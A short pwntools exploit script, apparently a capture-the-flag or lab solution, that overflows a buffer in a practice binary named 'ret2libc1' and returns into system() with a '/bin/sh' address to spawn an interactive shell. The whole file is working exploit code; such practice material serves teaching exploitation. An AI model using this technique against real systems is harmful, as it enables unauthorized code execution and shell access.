from pwn import *

p = process('./ret2libc1')
gdb.attach(p)
sysaddr = 0x08048460
binaddr = 0x08048720
playload = 'A'*112 + p32(sysaddr) + 'B'*4 + p32(binaddr)
p.sendline(playload)
p.interactive()
